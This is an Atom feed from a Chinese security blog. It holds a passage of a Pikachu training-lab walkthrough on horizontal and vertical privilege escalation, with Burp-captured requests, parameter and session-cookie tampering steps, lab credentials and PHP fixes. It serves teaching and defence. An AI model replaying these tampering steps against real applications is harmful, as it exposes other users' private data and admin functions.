<?xml version="1.0"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://bae-ace.github.io</id>
    <title>bae的博客 • Posts by &#34;漏洞分析&#34; category</title>
    <link href="https://bae-ace.github.io" />
    <updated>2025-08-02T10:00:32.000Z</updated>
    <category term="Web安全" />
    <category term="权限绕过" />
    <category term="水平越权" />
    <category term="垂e直越权" />
    <category term="Pikachu靶场" />
    <category term="Solr" />
    <category term="XXE" />
    <category term="漏洞复现" />
    <category term="Vulhub" />
    <category term="Kali" />
    <category term="PWN" />
    <category term="ELF" />
    <category term="ROP" />
    <category term="CTF" />
    <category term="二进制安全" />
    <category term="工具" />
    <category term="sqlmap" />
    <category term="渗透测试" />
    <category term="Struts2" />
    <category term="RCE" />
    <category term="OGNL注入" />
    <category term="ThinkPHP" />
    <category term="SQL注入" />
    <category term="网络安全" />
    <category term="PHP" />
    <category term="SSRF" />
    <category term="hexo" />
    <category term="博客搭建" />
    <category term="初始测试" />
    <category term="linux" />
    <category term="命令" />
    <category term="命令执行" />
    <category term="漏洞利用" />
    <category term="信息收集" />
    <category term="子域名" />
    <entry>
        <id>https://bae-ace.github.io/2025/08/02/Pikachu-%E9%9D%B6%E5%9C%BA%EF%BC%9A%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%EF%BC%88%E6%B0%B4%E5%B9%B3%E8%B6%8A%E6%9D%83%E4%B8%8E%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83%EF%BC%89/</id>
        <title>Pikachu 靶场：权限绕过漏洞（水平越权与垂直越权）</title>
        <link rel="alternate" href="https://bae-ace.github.io/2025/08/02/Pikachu-%E9%9D%B6%E5%9C%BA%EF%BC%9A%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%EF%BC%88%E6%B0%B4%E5%B9%B3%E8%B6%8A%E6%9D%83%E4%B8%8E%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83%EF%BC%89/"/>
        <content type="html">&lt;h1 id=&#34;Pikachu-靶场：权限绕过漏洞（水平越权与垂直越权）&#34;&gt;&lt;a href=&#34;#Pikachu-靶场：权限绕过漏洞（水平越权与垂直越权）&#34; class=&#34;headerlink&#34; title=&#34;Pikachu 靶场：权限绕过漏洞（水平越权与垂直越权）&#34;&gt;&lt;/a&gt;Pikachu 靶场：权限绕过漏洞（水平越权与垂直越权）&lt;/h1&gt;&lt;h2 id=&#34;一、前言&#34;&gt;&lt;a href=&#34;#一、前言&#34; class=&#34;headerlink&#34; title=&#34;一、前言&#34;&gt;&lt;/a&gt;一、前言&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;权限绕过漏洞&lt;/strong&gt;是 Web 应用中常见的安全问题，分为&lt;strong&gt;水平越权&lt;/strong&gt;和&lt;strong&gt;垂直越权&lt;/strong&gt;两种类型。这类漏洞源于后端未对用户权限进行严格校验，允许攻击者访问未授权的数据或执行受限操作。本文基于 &lt;strong&gt;Pikachu 靶场&lt;/strong&gt; 的 &lt;strong&gt;Over Permission 模块&lt;/strong&gt;，详细讲解水平越权和垂直越权的成因、危害、利用方式及修复方法，旨在帮助安全从业者和开发者深入理解并防范此类漏洞。&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;二、权限绕过漏洞概述&#34;&gt;&lt;a href=&#34;#二、权限绕过漏洞概述&#34; class=&#34;headerlink&#34; title=&#34;二、权限绕过漏洞概述&#34;&gt;&lt;/a&gt;二、权限绕过漏洞概述&lt;/h2&gt;&lt;h3 id=&#34;1-什么是权限绕过漏洞？&#34;&gt;&lt;a href=&#34;#1-什么是权限绕过漏洞？&#34; class=&#34;headerlink&#34; title=&#34;1. 什么是权限绕过漏洞？&#34;&gt;&lt;/a&gt;1. 什么是权限绕过漏洞？&lt;/h3&gt;&lt;p&gt;权限绕过漏洞是指 Web 应用未正确验证用户权限，导致攻击者能够访问或操作超出其权限范围的资源或功能。按权限方向分为两种类型：&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;类型&lt;/th&gt;
&lt;th&gt;定义&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;水平越权&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;普通用户 A 能访问普通用户 B 的资源或数据（如查看其他用户的隐私信息）&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;垂直越权&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;普通用户通过伪造参数，执行只有管理员才能完成的操作（如用户管理）&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;h3 id=&#34;2-危害&#34;&gt;&lt;a href=&#34;#2-危害&#34; class=&#34;headerlink&#34; title=&#34;2. 危害&#34;&gt;&lt;/a&gt;2. 危害&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;水平越权&lt;/strong&gt;：&lt;ul&gt;
&lt;li&gt;泄露其他用户的敏感信息（如个人信息、订单记录）&lt;/li&gt;
&lt;li&gt;篡改其他用户的数据&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;垂直越权&lt;/strong&gt;：&lt;ul&gt;
&lt;li&gt;执行管理功能（如创建&amp;#x2F;删除用户、修改系统配置）&lt;/li&gt;
&lt;li&gt;完全控制 Web 应用&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;潜在后果&lt;/strong&gt;：&lt;ul&gt;
&lt;li&gt;数据泄露&lt;/li&gt;
&lt;li&gt;系统功能滥用&lt;/li&gt;
&lt;li&gt;服务器被接管&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h2 id=&#34;三、靶场环境&#34;&gt;&lt;a href=&#34;#三、靶场环境&#34; class=&#34;headerlink&#34; title=&#34;三、靶场环境&#34;&gt;&lt;/a&gt;三、靶场环境&lt;/h2&gt;&lt;h3 id=&#34;1-靶场信息&#34;&gt;&lt;a href=&#34;#1-靶场信息&#34; class=&#34;headerlink&#34; title=&#34;1. 靶场信息&#34;&gt;&lt;/a&gt;1. 靶场信息&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;地址&lt;/strong&gt;：&lt;code&gt;http://192.168.147.137/pikachu/&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;监听端口&lt;/strong&gt;：81&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;漏洞模块&lt;/strong&gt;：&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;水平越权&lt;/strong&gt;：&lt;code&gt;/vul/overpermission/op1/&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;垂直越权&lt;/strong&gt;：&lt;code&gt;/vul/overpermission/op2/&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;测试工具&lt;/strong&gt;：&lt;ul&gt;
&lt;li&gt;Burp Suite（抓包与请求重放）&lt;/li&gt;
&lt;li&gt;浏览器（推荐 Firefox）&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;2-用户信息&#34;&gt;&lt;a href=&#34;#2-用户信息&#34; class=&#34;headerlink&#34; title=&#34;2. 用户信息&#34;&gt;&lt;/a&gt;2. 用户信息&lt;/h3&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;用户名&lt;/th&gt;
&lt;th&gt;密码&lt;/th&gt;
&lt;th&gt;角色&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;&lt;code&gt;kobe&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;（任意）&lt;/td&gt;
&lt;td&gt;普通用户&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;lucy&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;（任意）&lt;/td&gt;
&lt;td&gt;普通用户&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;admin&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;code&gt;123456&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;管理员&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;pikachu&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;code&gt;000000&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;普通用户&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;hr&gt;
&lt;h2 id=&#34;四、水平越权漏洞实战-🎯&#34;&gt;&lt;a href=&#34;#四、水平越权漏洞实战-🎯&#34; class=&#34;headerlink&#34; title=&#34;四、水平越权漏洞实战 🎯&#34;&gt;&lt;/a&gt;四、水平越权漏洞实战 🎯&lt;/h2&gt;&lt;h3 id=&#34;1-场景说明&#34;&gt;&lt;a href=&#34;#1-场景说明&#34; class=&#34;headerlink&#34; title=&#34;1. 场景说明&#34;&gt;&lt;/a&gt;1. 场景说明&lt;/h3&gt;&lt;p&gt;Pikachu 靶场的水平越权模块模拟了一个用户信息查询接口：&lt;/p&gt;
&lt;figure class=&#34;highlight routeros&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs routeros&#34;&gt;&lt;br&gt;&lt;span class=&#34;hljs-built_in&#34;&gt;GET&lt;/span&gt; /vul/overpermission/op1/op1_mem.php?&lt;span class=&#34;hljs-attribute&#34;&gt;username&lt;/span&gt;=xxx&lt;br&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;普通用户（如 &lt;code&gt;kobe&lt;/code&gt;）登录后，可通过该接口查看自己的信息。但由于后端未验证请求参数 &lt;code&gt;username&lt;/code&gt; 是否与当前用户匹配，攻击者可通过修改 &lt;code&gt;username&lt;/code&gt; 参数，访问其他用户（如 &lt;code&gt;lucy&lt;/code&gt;）的私有信息。&lt;/p&gt;
&lt;h3 id=&#34;2-攻击步骤&#34;&gt;&lt;a href=&#34;#2-攻击步骤&#34; class=&#34;headerlink&#34; title=&#34;2. 攻击步骤&#34;&gt;&lt;/a&gt;2. 攻击步骤&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;登录 kobe 账户&lt;/strong&gt;：&lt;ul&gt;
&lt;li&gt;访问 &lt;code&gt;http://192.168.147.137:81/pikachu/&lt;/code&gt;，使用 &lt;code&gt;kobe&lt;/code&gt; 登录。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;抓取请求&lt;/strong&gt;：&lt;ul&gt;
&lt;li&gt;打开 Burp Suite，配置代理（默认：&lt;code&gt;127.0.0.1:8080&lt;/code&gt;）。&lt;/li&gt;
&lt;li&gt;使用 Firefox 访问：&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs url&#34;&gt;http://192.168.147.137:81/vul/overpermission/op1/op1_mem.php?username=kobe&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;Burp 拦截到类似以下请求：&lt;figure class=&#34;highlight http&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs http&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;GET&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;/vul/overpermission/op1/op1_mem.php?username=kobe&lt;/span&gt; &lt;span class=&#34;hljs-meta&#34;&gt;HTTP/1.1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;Host&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;: &lt;/span&gt;192.168.147.137:81&lt;br&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;Cookie&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;: &lt;/span&gt;PHPSESSID=&amp;lt;kobe的session&amp;gt;&lt;br&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;User-Agent&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;: &lt;/span&gt;Mozilla/5.0 (Windows NT 10.0; Win64; x64)&lt;br&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;Accept&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;: &lt;/span&gt;text/html&lt;br&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;Connection&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;: &lt;/span&gt;close&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;&lt;strong&gt;修改参数&lt;/strong&gt;：&lt;ul&gt;
&lt;li&gt;在 Burp 的 Repeater 模块中，将 &lt;code&gt;username=kobe&lt;/code&gt; 改为 &lt;code&gt;username=lucy&lt;/code&gt;：&lt;figure class=&#34;highlight routeros&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs routeros&#34;&gt;&lt;span class=&#34;hljs-built_in&#34;&gt;GET&lt;/span&gt; /vul/overpermission/op1/op1_mem.php?&lt;span class=&#34;hljs-attribute&#34;&gt;username&lt;/span&gt;=lucy HTTP/1.1&lt;br&gt;Host: 192.168.147.137:81&lt;br&gt;Cookie: &lt;span class=&#34;hljs-attribute&#34;&gt;PHPSESSID&lt;/span&gt;=&amp;lt;kobe的session&amp;gt;&lt;br&gt;&lt;span class=&#34;hljs-built_in&#34;&gt;..&lt;/span&gt;.&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;发送请求&lt;/strong&gt;：&lt;ul&gt;
&lt;li&gt;点击发送，页面返回 &lt;code&gt;lucy&lt;/code&gt; 的隐私数据（如邮箱、电话等）。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;3-安全问题&#34;&gt;&lt;a href=&#34;#3-安全问题&#34; class=&#34;headerlink&#34; title=&#34;3. 安全问题&#34;&gt;&lt;/a&gt;3. 安全问题&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;后端直接信任 GET 参数 &lt;code&gt;username&lt;/code&gt;，未验证是否与当前会话用户（&lt;code&gt;$_SESSION[&amp;#39;user&amp;#39;]&lt;/code&gt;）匹配。&lt;/li&gt;
&lt;li&gt;缺乏用户身份校验，导致普通用户可访问任意用户的数据。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;4-修复建议&#34;&gt;&lt;a href=&#34;#4-修复建议&#34; class=&#34;headerlink&#34; title=&#34;4. 修复建议&#34;&gt;&lt;/a&gt;4. 修复建议&lt;/h3&gt;&lt;p&gt;在后端添加用户身份校验逻辑，确保请求的用户与会话用户一致：&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;hljs-variable&#34;&gt;$_SESSION&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;user&amp;#x27;&lt;/span&gt;] != &lt;span class=&#34;hljs-variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;username&amp;#x27;&lt;/span&gt;]) &amp;#123;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;die&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;非法访问！&amp;quot;&lt;/span&gt;);&lt;br&gt;&amp;#125;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;hr&gt;
&lt;h2 id=&#34;五、垂直越权漏洞实战&#34;&gt;&lt;a href=&#34;#五、垂直越权漏洞实战&#34; class=&#34;headerlink&#34; title=&#34;五、垂直越权漏洞实战&#34;&gt;&lt;/a&gt;五、垂直越权漏洞实战&lt;/h2&gt;&lt;h3 id=&#34;1-场景说明-1&#34;&gt;&lt;a href=&#34;#1-场景说明-1&#34; class=&#34;headerlink&#34; title=&#34;1. 场景说明&#34;&gt;&lt;/a&gt;1. 场景说明&lt;/h3&gt;&lt;p&gt;Pikachu 靶场的垂直越权模块模拟了一个管理员管理接口：&lt;/p&gt;
&lt;figure class=&#34;highlight awk&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs awk&#34;&gt;POST &lt;span class=&#34;hljs-regexp&#34;&gt;/vul/&lt;/span&gt;overpermission&lt;span class=&#34;hljs-regexp&#34;&gt;/op2/&lt;/span&gt;op2_admin_edit.php&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;管理员&lt;/strong&gt;（&lt;code&gt;admin&lt;/code&gt; &amp;#x2F; &lt;code&gt;123456&lt;/code&gt;）可通过该接口创建或修改用户信息。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;普通用户&lt;/strong&gt;（&lt;code&gt;pikachu&lt;/code&gt; &amp;#x2F; &lt;code&gt;000000&lt;/code&gt;）本应无权访问该接口。&lt;/li&gt;
&lt;li&gt;由于后端未验证用户角色，普通用户可伪造请求执行管理操作。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;2-攻击流程&#34;&gt;&lt;a href=&#34;#2-攻击流程&#34; class=&#34;headerlink&#34; title=&#34;2. 攻击流程&#34;&gt;&lt;/a&gt;2. 攻击流程&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;登录普通用户 pikachu&lt;/strong&gt;：&lt;ul&gt;
&lt;li&gt;访问 &lt;code&gt;http://192.168.147.137:81/pikachu/&lt;/code&gt;，使用 &lt;code&gt;pikachu&lt;/code&gt; &amp;#x2F; &lt;code&gt;000000&lt;/code&gt; 登录。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;抓取管理员请求&lt;/strong&gt;：&lt;ul&gt;
&lt;li&gt;&lt;p&gt;使用 &lt;code&gt;admin&lt;/code&gt; 账户登录，访问管理接口，抓取 POST 请求：&lt;/p&gt;
&lt;figure class=&#34;highlight http&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs http&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;POST&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;/vul/overpermission/op2/op2_admin_edit.php&lt;/span&gt; &lt;span class=&#34;hljs-meta&#34;&gt;HTTP/1.1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;Host&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;: &lt;/span&gt;192.168.147.137:81&lt;br&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;Cookie&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;: &lt;/span&gt;PHPSESSID=&amp;lt;admin的session&amp;gt;&lt;br&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;Content-Type&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;: &lt;/span&gt;application/x-www-form-urlencoded&lt;br&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;Content-Length&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;: &lt;/span&gt;133&lt;br&gt;&lt;br&gt;&lt;span class=&#34;language-dts&#34;&gt;&lt;span class=&#34;hljs-attr&#34;&gt;username&lt;/span&gt;&lt;span class=&#34;hljs-operator&#34;&gt;=&lt;/span&gt;t3&lt;span class=&#34;hljs-variable&#34;&gt;&amp;amp;password&lt;/span&gt;=&lt;span class=&#34;hljs-number&#34;&gt;123456&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;&amp;amp;sex&lt;/span&gt;=女&lt;span class=&#34;hljs-variable&#34;&gt;&amp;amp;phonenum&lt;/span&gt;=&lt;span class=&#34;hljs-number&#34;&gt;12345678908&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;&amp;amp;email&lt;/span&gt;=t3@qq.com&lt;span class=&#34;hljs-variable&#34;&gt;&amp;amp;address&lt;/span&gt;=北京&lt;span class=&#34;hljs-variable&#34;&gt;&amp;amp;submit&lt;/span&gt;=创建&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;替换 Cookie&lt;/strong&gt;：&lt;ul&gt;
&lt;li&gt;&lt;p&gt;在 Burp Repeater 中，将请求的 &lt;code&gt;Cookie&lt;/code&gt; 替换为 &lt;code&gt;pikachu&lt;/code&gt; 的会话：&lt;/p&gt;
&lt;figure class=&#34;highlight routeros&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs routeros&#34;&gt;Cookie: &lt;span class=&#34;hljs-attribute&#34;&gt;PHPSESSID&lt;/span&gt;=&amp;lt;pikachu的session&amp;gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;重放请求&lt;/strong&gt;：&lt;ul&gt;
&lt;li&gt;发送修改后的 POST 请求，观察响应。&lt;/li&gt;
&lt;li&gt;如果成功，系统创建新用户 &lt;code&gt;t3&lt;/code&gt; 。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;3-安全问题-1&#34;&gt;&lt;a href=&#34;#3-安全问题-1&#34; class=&#34;headerlink&#34; title=&#34;3. 安全问题&#34;&gt;&lt;/a&gt;3. 安全问题&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;管理员功能接口仅由前端隐藏（如菜单不可见），后端未验证用户角色。&lt;/li&gt;
&lt;li&gt;普通用户通过伪造请求即可执行敏感操作（如创建用户）。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;4-修复建议-1&#34;&gt;&lt;a href=&#34;#4-修复建议-1&#34; class=&#34;headerlink&#34; title=&#34;4. 修复建议&#34;&gt;&lt;/a&gt;4. 修复建议&lt;/h3&gt;&lt;p&gt;在后端添加角色校验逻辑，确保只有管理员可访问管理接口：&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;hljs-variable&#34;&gt;$_SESSION&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;role&amp;#x27;&lt;/span&gt;] != &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;admin&amp;#x27;&lt;/span&gt;) &amp;#123;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;die&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;无权访问该接口！&amp;quot;&lt;/span&gt;);&lt;br&gt;&amp;#125;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;hr&gt;
&lt;h2 id=&#34;六、漏洞原理总结&#34;&gt;&lt;a href=&#34;#六、漏洞原理总结&#34; class=&#34;headerlink&#34; title=&#34;六、漏洞原理总结&#34;&gt;&lt;/a&gt;六、漏洞原理总结&lt;/h2&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;项目&lt;/th&gt;
&lt;th&gt;水平越权&lt;/th&gt;
&lt;th&gt;垂直越权&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;漏洞位置&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;用户间数据接口&lt;/td&gt;
&lt;td&gt;后台管理功能接口&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;攻击方式&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;修改 &lt;code&gt;username&lt;/code&gt; 参数&lt;/td&gt;
&lt;td&gt;重放管理员请求，伪造普通用户身份&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;问题本质&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;未验证请求是否属于当前用户&lt;/td&gt;
&lt;td&gt;未验证用户是否具有管理员权限&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;危害&lt;/strong&gt;&lt;/td&gt;
